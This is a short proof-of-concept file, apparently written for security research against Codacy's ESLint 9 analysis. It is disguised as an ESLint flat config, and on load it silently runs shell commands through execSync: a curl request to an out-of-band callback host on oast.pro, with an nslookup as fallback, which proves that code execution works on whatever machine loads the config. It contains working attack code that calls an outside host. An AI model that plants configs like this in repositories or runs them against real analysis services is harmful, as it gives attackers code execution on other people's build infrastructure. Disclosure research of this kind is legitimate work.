// Codacy LEAD-003 PoC — ESLint9 flat config code execution
// Replace OAST_HOST before use: interactsh-client -s oast.pro
import { execSync } from "node:child_process";
const OAST_HOST = "db5su1fkntr8hva7hjsgscpjyb6qefh4k.oast.pro";
(async () => {
  try {
    execSync(`curl -sf --max-time 5 https://${OAST_HOST}/codacy-eslint9-exec-proof`, { timeout: 6000 });
  } catch (_) {
    try { execSync(`nslookup ${OAST_HOST}`, { timeout: 3000 }); } catch (__) {}
  }
})();
export default [{ rules: {} }];
